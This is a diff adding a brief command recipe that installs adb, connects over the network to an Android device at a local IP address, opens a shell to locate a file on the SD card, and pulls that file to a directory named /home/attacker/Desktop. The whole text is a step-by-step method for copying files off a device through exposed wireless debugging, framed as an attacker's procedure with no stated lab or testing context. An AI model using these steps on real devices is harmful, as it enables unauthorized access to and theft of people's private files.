@@ -1,0 +1,11 @@
+apt-get update
+sudo apt-get install adb -y
+adb devices -l
+
+adb connect 192.168.0.4:5555
+adb devices -l
+adb shell
+Find the location of the file cd SD Card :: ls 
+After finding location exit shell and use pull command below to get the file to local
+
+adb pull /sdcard/Download/file.txt /home/attacker/Desktop
